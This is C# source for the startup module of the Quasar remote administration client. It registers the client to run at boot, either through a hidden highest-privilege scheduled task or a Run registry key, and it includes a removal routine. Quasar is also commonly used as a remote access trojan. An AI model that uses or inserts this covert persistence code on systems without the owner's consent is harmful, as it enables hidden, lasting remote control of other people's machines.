using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.Runtime.Remoting.Messaging;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        private string GetHKLMPath()
        {
            if (!PlatformHelper.Is64Bit)
            {
                return "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            }
            return "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";
        }
        public void AddToStartup(string executablePath, string startupName)
        {

            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + startupName + "\" /sc ONSTART /tr \"" + executablePath +
                                "\" /rl HIGHEST /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                try
                {
                    Process p = Process.Start(startInfo);
                    p.WaitForExit(1000);
                    if(p.ExitCode != 0) 
                    {
                        MessageBox.Show($"Failed to create client task. Exit code: {p.ExitCode}");
                    }

                }
                catch(Exception ex)
                {
                    MessageBox.Show($"An error occured while starting client task: {ex.Message}");
                }
                //ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                //{
                //    Arguments = "/create /tn \"" + startupName + "\" " +
                //        "/sc ONSTART /tr \"" + executablePath + "\" " + // Change to ONSTART for immediate start on task creation
                //        "/rl HIGHEST /f " +
                //        "/Z " + // Allows the task to run on battery
                //        "/du UNLIMITED " + // Removes the duration limit
                //        "/ri 1 /retry 10 " + // Restart every 1 minutes, up to 10 times
                //        "/F /IT", // /IT: Run the task immediately after creation
                //    UseShellExecute = false,
                //    CreateNoWindow = true
                //};

                //Process p = Process.Start(startInfo);
                //p.WaitForExit(1000);
                //if (p.ExitCode == 0) return;

                //bool result = RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, GetHKLMPath(), startupName, executablePath) || RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, GetHKLMPath(), startupName, executablePath);
                //if (result) return;
            }

            RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
                true);
        }

        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/delete /tn \"" + startupName + "\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                if (p.ExitCode == 0) return;
            }

            RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);

        }
    }
}
